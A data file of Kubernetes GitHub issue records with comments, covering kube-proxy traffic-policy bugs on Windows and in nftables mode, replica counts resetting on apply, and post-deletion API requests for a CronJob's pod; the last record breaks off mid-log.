{"repo": "kubernetes/kubernetes", "issue_number": 133928, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133928", "issue_title": "ClusterIP load balancers intermittently deleted in HNS by Windows KubeProxy when internalTrafficPolicy is set to Local", "issue_author": "princepereira", "issue_body": "### What happened?\n\nWhen internalTrafficPolicy was set to Local, Windows KubeProxy intermittently deleted the corresponding ClusterIP load balancers in HNS. This caused service connectivity disruptions since the load balancer rules were unexpectedly removed.\n\n### What did you expect to happen?\n\nClusterIP load balancers in HNS should remain consistently present and stable, even when internalTrafficPolicy is set to Local. The configuration should not trigger deletion of the load balancer or service disruptions.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n- Create a ClusterIP service in a multi node cluster with internalTrafficPolicy tag set to Local.\n- Scale up the pods to some good number so that few of the pods came up in remote node (Node B).\n- Keep monitoring the traffic initiated from a different client pod to the clusterip after the scale.\n- Scale up or down, but make sure the new pod coming up or new pod getting deleted happens in node b (neighbor node). \n- Make a connection to the clusterip from a client pod in the node A.\n- The connection won't succeed.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# 1.31+\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nAKS\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\nWindows Server 2022\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/network", "sig/windows", "triage/accepted"], "comments": [{"author": "princepereira", "body": "/assign @princepereira "}, {"author": "princepereira", "body": "/sig windows network"}, {"author": "MikeZappa87", "body": "/triage accepted"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 67135, "issue_url": "https://github.com/kubernetes/kubernetes/issues/67135", "issue_title": "Removing spec.replicas of the Deployment resets replicas count to single replica", "issue_author": "kirs", "issue_body": "/kind bug\r\n\r\n**What happened**:\r\n\r\nA Deployment spec with hardcoded `replicas` parameter was applied:\r\n\r\n```yml\r\napiVersion: extensions/v1beta1\r\nkind: Deployment\r\nmetadata:\r\n  labels:\r\n    name: critical-service\r\n  name: critical-service\r\nspec:\r\n  replicas: 100\r\n  ...\r\n```\r\n\r\nLater, we've decided to let the `replicas` value be dynamic to be able to manage it with `kubectl scale`, without changing YAML every time. So we applied another spec, without the `replicas` key:\r\n\r\n```diff\r\ndiff --git a/deployment.yml b/deployment.yml\r\nindex 339531d..f5a3e5f 100644\r\n--- a/deployment.yml\r\n+++ b/deployment.yml\r\n@@ -5,5 +5,4 @@ metadata:\r\n     name: critical-service\r\n   name: critical-service\r\n spec:\r\n-  replicas: 100\r\n   ...\r\n```\r\n\r\nAfter the updated spec was applied, Kubernetes ignored existing `replicas` count and scaled the RS down to 1 replica. This was a very unexpected behaviour to scale down an existing deployment.\r\n\r\n**What you expected to happen**:\r\n\r\nWe expected that skipping `replicas` line in YAML would **preserve** existing replicas count, but in fact it reset all of them to default value which is `1` replicas. This effectively scaled lack of capacity and a severe service distruption to a service that had > 1000 replicas.\r\n\r\n**How to reproduce it (as minimally and precisely as possible)**:\r\n\r\n1. Create a deployment from a YAML file with hardcoded `replicas` count, with the value above `1`\r\n2. Remove `replicas` line from the YAML and apply the file\r\n3. See ReplicaSet being scaled down to `1` replicas, instead of preserving existing value above `1`\r\n\r\n**Anything else we need to know?**:\r\n\r\n**For us this feels that scaling down by default is an extremely dangerous behaviour.** It makes sense to use the default of 1 replica for new resources, but not for existing resources that have thousands of replicas running.\r\n\r\n**Environment**:\r\n\r\n- Kubernetes version: v1.10.5-gke.3\r\n- Cloud provider or hardware configuration: GKE\r\n", "issue_labels": ["kind/bug", "needs-sig"], "comments": [{"author": "k8s-ci-robot", "body": "@kirs: There are no sig labels on this issue. Please add a sig label.\n\n<details>\n\nA sig label can be added by either:\n\n1. mentioning a sig: `@kubernetes/sig-<group-name>-<group-suffix>`\n    e.g., `@kubernetes/sig-contributor-experience-<group-suffix>` to notify the contributor experience sig, OR\n\n2. specifying the label manually: `/sig <group-name>`\n    e.g., `/sig scalability` to apply the `sig/scalability` label\n\nNote: Method 1 will trigger an email to the group. See the [group list](https://git.k8s.io/community/sig-list.md).\nThe `<group-suffix>` in method 1 has to be replaced with one of these: _**bugs, feature-requests, pr-reviews, test-failures, proposals**_\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "liggitt", "body": "defaults are applied for missing values on both create and update.\r\n\r\nto let the replicas field be ignored by apply, omit it from the initial applied manifest\r\n\r\nto stop replicas from being managed by apply, use `kubectl apply edit-last-applied` (or `kubectl apply set-last-applied`) to remove the replicas field from the saved \"last applied\" state prior to applying the new manifest to keep `apply` from removing the replicas field (which makes the apiserver default back to 1)\r\n\r\n/close"}, {"author": "kirs", "body": "@liggitt thanks for the tip! `apply set-last-applied` is indeed helpful in this case.\r\n\r\nI understand that it comes from the default value of `1` being set because `replicas` line is missing.\r\n\r\nMy intention for opening this issue was more about starting a conversation about what's the best default behaviour for Kubernetes. \r\n\r\nAs for me and for my colleagues, it seems like scaling down by default is an _extremely dangerous_ behaviour. It makes sense to use the default of 1 replica for new resources, but Kubernetes should not scale down existing resources that have thousands of replicas live.\r\n\r\nI'll be looking forward to make a change for ReplicaSet controller to make this behaviour slightly safer and a bit less unexpected. Let me know what you think!"}, {"author": "ravihugo", "body": "Just got hit by this too. Our CI environment does not currently set the replica value because we would rather manage this separately. So now it looks like we'll need to start managing this in the CI environment. Also the suggested work-around seems a bit strange. Is that equivalent of the first apply setting the replica size to 1 and then re-apply it back to 100 (for example).\r\n\r\nWouldn't that massively affect what the rolling update would look like?\r\n\r\nIn case anyone needs our fix it basically looks like this:\r\n```\r\nREPLICA_COUNT=$(kubectl -n $ENV get deployment ${DEPLOYMENT_NAME} -o=jsonpath='{$.spec.replicas}')\r\n# Runs sed to replace CI_COMMIT_SHA located anywhere in the template file. Passes output of sed directly to kubectl's deploy\r\nsed -e \"s/\\$CI_COMMIT_SHA/$CI_COMMIT_SHA/\" -e \"s/\\#REPLICA_COUNT/replicas: ${REPLICA_COUNT:-1}/\" kube-deploy.template.yaml | kubectl -n $ENV apply -f -\r\n```\r\nAnd our template kube-deploy.template.yaml has #REPLICA_COUNT in the proper place:\r\n```\r\napiVersion: apps/v1beta2\r\nkind: Deployment\r\nmetadata:\r\n  name: taco-service\r\nspec:\r\n  #REPLICA_COUNT\r\n  selector:\r\n    matchLabels:\r\n```\r\nThe reason I chose to put this in as #REPLICA_COUNT was basically to avoid error reports from VSCode since my Yaml files get red-underlines if I try to get too fancy.\r\n\r\nOh - forgot to mention, the primary reason we opted to not use kubectl rolling-update and use kubectl apply is because rolling-update primary can affect like 1 attribute, and the primary use-case is just the image name. We like the ability to control mounts, RAM, variables, etc.. with each git push. This makes our CI environment easier when we do have to make such changes."}, {"author": "chrissound", "body": "This seems to be in  contradiction to what `kubectl apply` is documented as.  It (replica count) also does not show up as a change when using `kubectl diff -f`..."}, {"author": "rwenz3l", "body": "Stumbled upon this today and I also find it difficult to handle. I've started to deploy services with 2, 8 and 20 replicas in certain places and just resetting them to 1 when removing the line seems dangerous to me as well. I always check with `kubectl diff -f ...` before `apply`ing.. but changing with the `kubectl apply set-last-applied` is annoying as well. I'd love to get a different behavior/flag/whatever. Maybe at least a small snippet for batch-editing the deployments."}, {"author": "collimarco", "body": "I also find [this behavior](https://technologyconversations.com/2018/10/10/to-replicas-or-not-to-replicas-in-kubernetes-deployments-and-statefulsets/) extremely confusing and against the declarative approach of Kubernetes.\r\n\r\n**Maybe a solution would be to have a `replicas: auto` instead of leaving out the key/value pair?** In this way K8s knows that we want to change that option and not keep the key/value pair of a previous `apply`."}, {"author": "ayk33", "body": "Is there a reason this issue was closed? This behavior seems very troubling.. Running a deployment with 300+ pods and losing them instantly can cause some serious issues."}, {"author": "EronWright", "body": "Here's some documentation on how to handle this situation where you want to safely transfer ownership of the replicas field to an autoscaler:\r\nhttps://kubernetes.io/docs/reference/using-api/server-side-apply/#transferring-ownership\r\n\r\nTo recap why the replicas was being reset to one, it is because you took ownership of the field in the first step, and when you cleared it, nobody was left as the owner and so the default value was applied.  You were \"unsetting\" the value.\r\nIn CSA mode, the \"last-applied-configuration\" annotation tracks ownership, and that's why one must edit it to relinquish ownership as mentioned [here](https://github.com/kubernetes/kubernetes/issues/67135#issuecomment-411429723).\r\nIn SSA mode, ownership is tracked on the server via `.metadata.managedFields`, and must be transferred to another owner as described in the above link. Either way, ownership must be relinquished beforehand.\r\n"}, {"author": "Zeouterlimits", "body": "> I also find [this behavior](https://technologyconversations.com/2018/10/10/to-replicas-or-not-to-replicas-in-kubernetes-deployments-and-statefulsets/) extremely confusing and against the declarative approach of Kubernetes.\n\nMaybe a solution would be to have a replicas: auto instead of leaving out the key/value pair? In this way K8s knows that we want to change that option and not keep the key/value pair of a previous apply.\n\nThis is a great idea by @collimarco "}, {"author": "younsl", "body": "I'd like to share a recent production incident that demonstrates the severity of this issue in real-world scenarios.\n\n<details>\n<summary>Production Incident Report - Dangerous Replica Reset Behavior</summary>\n\n## Background\n\ninitially encountered pod count yo-yo effects described in [issue #25238](https://github.com/kubernetes/kubernetes/issues/25238), where deployment updates with HPA caused replicas to jump unexpectedly (e.g., from 3 to 9, then scale down to 6, then back to HPA target). To resolve this replicas flapping behavior, we decided to [remove spec.replicas from our Deployment manifests](https://argo-cd.readthedocs.io/en/stable/user-guide/best_practices/#leaving-room-for-imperativeness) when HPA is enabled.\n\nHowever, this solution led us directly into the dangerous behavior described in this issue - we avoided one problem only to encounter a much more severe single replica reset issue.\n\n## Incident Timeline:\n\n1. Initial State: Production deployment was running with spec.replicas: 10\n2. Configuration Change: Applied conditional logic to remove spec.replicas when HPA is enabled in deployment template\n\n```yaml\n# my-app/templates/deployment.yaml\nspec:\n  # Do not include replicas in the manifests if you want replicas to be controlled by HPA\n  {{- if not .Values.autoscaling.enabled }}\n  replicas: {{ .Values.replicaCount }}\n  {{- end }}\n```\n\n3. Manual Sync: Both HPA and Deployment resources were managed within a single ArgoCD Application. Manually triggered sync in ArgoCD UI to apply the changes.\n4. Critical Issue: spec.replicas was reset from 10 to 1 (default value)\n5. Service Disruption: 9 of 10 pods were immediately terminated, leaving only 1 pod running\n6. Recovery: HPA eventually scaled back from 1 to 10 pods, but significant downtime occurred\n\n</details>\n\nWhat would be the best approach to prevent this dangerous behavior? This unexpected behavior is very horrible in production workloads. Can't imagine if this had been a mission-critical production workload running 100 replicas."}, {"author": "alexgo84", "body": "Since this surprising behavior is still taking place, I'm resorting to use heuristics for setting the replicas explicitly, even when HPA is enabled.\nA solution, or at least the reopening this issue, would be most welcome!"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131765, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131765", "issue_title": "kube-proxy: externalTrafficPolicy:Local and proxy-mode=nftables blackholes pods traffic to external IPs", "issue_author": "ffilippopoulos", "issue_body": "### What happened?\n\nWhen using kube-proxy on nftables mode and specify a `LoadBalancer` Service with `externalTrafficPolicy:Local` that has an ExternalIP assigned, kube-proxy will create an entry in the kube-proxy ip nftable that will drop traffic to that external IP, like:\n\n```\n        map no-endpoint-services {\n                type ipv4_addr . inet_proto . inet_service : verdict\n                comment \"vmap to drop or reject packets to services with no endpoints\"\n                elements = { \n                             10.88.1.2 . tcp . 80 comment \"sys-ingress-priv/internal-ingress-controller-v2:web\" : drop,\n```\n\nAs a result, any pod on the host cannot send traffic to the external IP of the LoadBalancer.\n\n### What did you expect to happen?\n\nOn nodes where no workload is present, traffic should not be dropped but load balanced by kube proxy to the target Service endpoints.\nThis will also bring consistency with how other modes work, as this issue was addressed both for ipvs (https://github.com/kubernetes/kubernetes/issues/93456)\nand iptables (https://github.com/kubernetes/kubernetes/pull/77523) modes.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nRun kube-proxy on nftables mode and try hitting a `LoadBalancer` Service `ExternalIP` from within a pod running in a node that does not have ready endpoints of the target service\n\n### Anything else we need to know?\n\n@kubernetes/sig-network-bugs\nSimmilar to https://github.com/kubernetes/kubernetes/issues/75262 but for `nftables` mode\n\n### Kubernetes version\n\n<details>\n\n```console\nServer Version: v1.33.0\n```\n\n</details>\n\nkube-proxy: v1.33.0\n\n### Cloud provider\n\naws, gcp and bare metal\n\n### OS version\n\n_No response_\n\n### Install tools\n\n_No response_\n\n### Container runtime (CRI) and version (if applicable)\n\n_No response_\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n_No response_", "issue_labels": ["kind/bug", "sig/network", "triage/accepted"], "comments": [{"author": "k8s-ci-robot", "body": "@ffilippopoulos: Reiterating the mentions to trigger a notification: \n@kubernetes/sig-network-bugs\n\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131765):\n\n>### What happened?\n>\n>When using kube-proxy on nftables mode and specify a `LoadBalancer` Service with `externalTrafficPolicy:Local` that has an ExternalIP assigned, kube-proxy will create an entry in the kube-proxy ip nftable that will drop traffic to that external IP, like:\n>\n>```\n>        map no-endpoint-services {\n>                type ipv4_addr . inet_proto . inet_service : verdict\n>                comment \"vmap to drop or reject packets to services with no endpoints\"\n>                elements = { \n>                             10.88.1.2 . tcp . 80 comment \"sys-ingress-priv/internal-ingress-controller-v2:web\" : drop,\n>```\n>\n>As a result, any pod on the host cannot send traffic to the external IP of the LoadBalancer.\n>\n>### What did you expect to happen?\n>\n>On nodes where no workload is present, traffic should not be dropped but load balanced by kube proxy to the target Service endpoints.\n>This will also bring consistency with how other modes work, as this issue was addressed both for ipvs (https://github.com/kubernetes/kubernetes/issues/93456)\n>and iptables (https://github.com/kubernetes/kubernetes/pull/77523) modes.\n>\n>### How can we reproduce it (as minimally and precisely as possible)?\n>\n>Run kube-proxy on nftables mode and try hitting a `LoadBalancer` Service `ExternalIP` from within a pod running in a node that does not have ready endpoints of the target service\n>\n>### Anything else we need to know?\n>\n>@kubernetes/sig-network-bugs\n>Simmilar to https://github.com/kubernetes/kubernetes/issues/75262 but for `nftables` mode\n>\n>### Kubernetes version\n>\n><details>\n>\n>```console\n>Server Version: v1.33.0\n>```\n>\n></details>\n>\n>kube-proxy: v1.33.0\n>\n>### Cloud provider\n>\n>aws, gcp and bare metal\n>\n>### OS version\n>\n>_No response_\n>\n>### Install tools\n>\n>_No response_\n>\n>### Container runtime (CRI) and version (if applicable)\n>\n>_No response_\n>\n>### Related plugins (CNI, CSI, ...) and versions (if applicable)\n>\n>_No response_\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "aojea", "body": "ping @danwinship @aroradaman"}, {"author": "aroradaman", "body": "/assign"}, {"author": "aroradaman", "body": "I was able to reproduce this for LoadBalancerIPs.\n \nWe short-circuit traffic originating within the cluster (from pods or workers) that is destined for external addresses (LoadBalancerIP, ExternalIP, or NodePort), DNATing it to cluster endpoints rather than local endpoints.\n\nThe filter-output is hooked to output hook with a priority lower than DNAT (-110), and the packets are dropped before the short-circuiting kicks in.\nconfirmed with trace\n```\ntrace id f97b367d ip filter trace packet: oif \"eth0\" ip saddr 172.18.0.3 ip daddr 172.18.0.100 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 53570 ip length 60 tcp sport 53880 tcp dport 3000 tcp flags == syn tcp window 64240 \ntrace id f97b367d ip filter trace rule ip daddr 172.18.0.100 meta nftrace set 1 (verdict continue)\ntrace id f97b367d ip filter trace verdict continue \ntrace id f97b367d ip filter trace policy accept \ntrace id f97b367d ip kube-proxy filter-output packet: oif \"eth0\" ip saddr 172.18.0.3 ip daddr 172.18.0.100 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 53570 ip length 60 tcp sport 53880 tcp dport 3000 tcp flags == syn tcp window 64240 \ntrace id f97b367d ip kube-proxy filter-output rule ct state new jump service-endpoints-check (verdict jump service-endpoints-check)\ntrace id f97b367d ip kube-proxy service-endpoints-check rule ip daddr . meta l4proto . th dport vmap @no-endpoint-services (verdict drop)\ntrace id 587493e0 ip filter trace packet: oif \"eth0\" ip saddr 172.18.0.3 ip daddr 172.18.0.100 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 53571 ip length 60 tcp sport 53880 tcp dport 3000 tcp flags == syn tcp window 64240 \ntrace id 587493e0 ip filter trace rule ip daddr 172.18.0.100 meta nftrace set 1 (verdict continue)\ntrace id 587493e0 ip filter trace verdict continue \ntrace id 587493e0 ip filter trace policy accept \ntrace id 587493e0 ip kube-proxy filter-output packet: oif \"eth0\" ip saddr 172.18.0.3 ip daddr 172.18.0.100 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 53571 ip length 60 tcp sport 53880 tcp dport 3000 tcp flags == syn tcp window 64240 \ntrace id 587493e0 ip kube-proxy filter-output rule ct state new jump service-endpoints-check (verdict jump service-endpoints-check)\ntrace id 587493e0 ip kube-proxy service-endpoints-check rule ip daddr . meta l4proto . th dport vmap @no-endpoint-services (verdict drop)\n```\n\n"}, {"author": "aroradaman", "body": "/triage accepted"}, {"author": "aroradaman", "body": "@danwinship I tried to set priority of all filter chains to 0 (default filter priority) and handle the firewall-check case which happens in filter-prerouting and filter-output using original destination IP and port from conntrack but it turns out we can not match on `inet_service` data type with `ct original proto-dst` expression.\n(ref: https://wiki.nftables.org/wiki-nftables/index.php/Data_types#IP_types)\n\n```\nE0622 17:16:35.104974       1 proxier.go:1850] \"nftables sync failed\" err=<\n    /dev/stdin:61:75-97: Error: can not use variable sized data types (invalid) in concat expressions\n    add rule ip kube-proxy firewall-check ct original ip daddr . meta l4proto . ct original proto-dst vmap @firewall-ips\n                                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^\n```\n\nI was thinking of having `filter-prerouting-pre-dnat` and `filter-output-pre-dnat` chains hooked with -110 priority. These chains  will jump to firewall check. And `filter-input`, `filter-forward`, `filter-output` chains hooked with priority 0. \nWe can also merge the `filter-output-post-dnat` into `filter-output` with this change.\n"}, {"author": "danwinship", "body": "> it turns out we can not match on `inet_service` data type with `ct original proto-dst` expression\n\nThat error seems wrong... the man page claims that `proto-dst` is a 16-bit integer, so it shouldn't be saying it's \"variable sized\"... but at any rate, even if it is a bug and they fix it, we can't depend on that fix for a long time.\n\n"}, {"author": "aroradaman", "body": "@danwinship @aojea Do we have an e2e for this? I couldn't find any."}, {"author": "danwinship", "body": "It looks like we only have a single ExternalIPs test, which only tests the short-circuiting of pod-to-externalIP traffic.\n\nExternalIPs are only half a feature (we define what happens when externalIP traffic reaches the cluster, but we don't define any way to allocate an externalIP) so they can't really be tested portably. We could probably write some tests that would work at least under kind.\n\nBut then, the other problem is that we recommend that people disable externalIPs anyway..."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131287, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131287", "issue_title": "The garbage collector successfully deletes the CronJob and its associated Pod; however, Kubernetes subsequently issues GET requests for both the Pod and the Deployment(with pod name)", "issue_author": "manish10-hub", "issue_body": "### What happened?\n\nBackground:\nI created a CronJob named ```acadia-image-eviction-job``` with the ```ttlSecondsAfterFinished: 86400``` setting. Upon execution, this CronJob created a Pod with the name ```acadia-image-eviction-job-28976255-cc47j```.\nOnce the Job completed, the Kubernetes garbage collector correctly deleted both the Job and the corresponding Pod as expected.\nHowever, I observed some unexpected behavior afterward:\nKubernetes initiated a GET request for a deployment using the Pod name.\nApproximately 32 hours later, Kubernetes made another GET request for the Pod using the correct Pod name.\nThis raises the question of why such requests are being made, especially when ttlSecondsAfterFinished is explicitly set to 86400 seconds (24 hours).\nAttached are the relevant logs for the Pod for reference.\n```\n<head></head>\n2025-02-03 15:11:15 | Begin ProcessImageEviction | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n-- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | --\n2025-02-03 15:11:15 | [eventing.publisherImpl.connectToKafka] Creating Kafka producer with endpoints: [kafka-0-mh-yzhpdqxqdhqxpxdlvpjj.private.us-south.messagehub.appdomain.cloud:9093 kafka-1-mh-yzhpdqxqdhqxpxdlvpjj.private.us-south.messagehub.appdomain.cloud:9093 kafka-2-mh-yzhpdqxqdhqxpxdlvpjj.private.us-south.messagehub.appdomain.cloud:9093] | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:16 | I0203 09:41:15.592145\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"GET\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j\" latency=\"1.830492ms\" userAgent=\"kubelet/v1.29.9 (linux/amd64) kubernetes/114a1f5\" audit-ID=\"08c4e11a-c190-4eeb-9aee-19748a8ebd74\" srcIP=\"10.51.170.59:49600\" apf_pl=\"system\" apf_fs=\"system-nodes\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"1.60048ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:16 | I0203 09:41:15.599334\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"PATCH\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j/status\" latency=\"6.293744ms\" userAgent=\"kubelet/v1.29.9 (linux/amd64) kubernetes/114a1f5\" audit-ID=\"56a4d9bc-6220-4c00-a016-8b259e1840e0\" srcIP=\"10.51.170.59:49600\" apf_pl=\"system\" apf_fs=\"system-nodes\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"5.984343ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:16 | Processing starting for resource | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:16 | Processing complete for resource with update | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:16 | I0203 09:41:15.603897\u00a0\u00a0720470 pod_startup_latency_tracker.go:102] \"Observed pod startup duration\" pod=\"genctl/acadia-image-eviction-job-28976255-cc47j\" podStartSLOduration=4.830957699 podStartE2EDuration=\"6m15.603843321s\" podCreationTimestamp=\"2025-02-03 09:35:00 +0000 UTC\" firstStartedPulling=\"2025-02-03 09:35:04.219758043 +0000 UTC m=+3361863.614132070\" lastFinishedPulling=\"2025-02-03 09:41:14.99264366 +0000 UTC m=+3362234.387017692\" observedRunningTime=\"2025-02-03 09:41:15.599547747 +0000 UTC m=+3362234.993921779\" watchObservedRunningTime=\"2025-02-03 09:41:15.603843321 +0000 UTC m=+3362234.998217348\"\n2025-02-03 15:11:16 | [2025/02/03 09:41:16] [ info] [input:tail:input_tail_container_logs] inotify_fs_add(): inode=11075207 watch_fd=86613 name=/var/log/containers/acadia-image-eviction-job-28976255-cc47j_genctl_acadia-image-eviction-job-2219e9c93dfd71d3cdfb400315a6fe2ccea78b922bb9d9e932917fac10d716b2.log | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:25 | I0203 09:41:24.579773\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 trace.go:219] Trace[745171306]: \"List\" accept:application/json, */*,audit-id:ab09692b-b4c5-483c-ad9e-28eab42cf431,client:172.30.29.69,protocol:HTTP/2.0,resource:imagearchives,scope:cluster,url:/apis/image.rias.ibm.com/v1alpha1/imagearchives,user-agent:acadia-image-eviction-job/v0.0.0 (linux/amd64) kubernetes/$Format/acadia-image-eviction-job-28976255-cc47j,verb:LIST (03-Feb-2025 09:41:15.204) (total time: 9375ms): | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:25 | I0203 09:41:24.579844\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"LIST\" URI=\"/apis/image.rias.ibm.com/v1alpha1/imagearchives?labelSelector=image_archive.acadia_status%3Dcompleted\" latency=\"9.375806626s\" userAgent=\"acadia-image-eviction-job/v0.0.0 (linux/amd64) kubernetes/$Format/acadia-image-eviction-job-28976255-cc47j\" audit-ID=\"ab09692b-b4c5-483c-ad9e-28eab42cf431\" srcIP=\"172.30.29.69:34894\" apf_pl=\"exempt\" apf_fs=\"exempt\" apf_execution_time=\"9.375620679s\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:25 | RoundTrip: peer certificate :: SN: 296256592080292144230695847868833894271969405412 Issuer: CN=rias-ng-us-south-dal13-preprod_issuing_ca Subject: CN=regional-extension-server,OU=IBM Cloud Virtual Private Cloud,L=Armonk,ST=New York,C=US CN: regional-extension-server | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:25 | End ProcessImageEviction | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:26 | I0203 09:41:25.669856\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"GET\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j\" latency=\"3.911684ms\" userAgent=\"kubelet/v1.29.9 (linux/amd64) kubernetes/114a1f5\" audit-ID=\"0574d69b-5fd2-4fa1-812b-6d80c48f1fce\" srcIP=\"10.51.170.59:49600\" apf_pl=\"system\" apf_fs=\"system-nodes\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"3.6756ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | 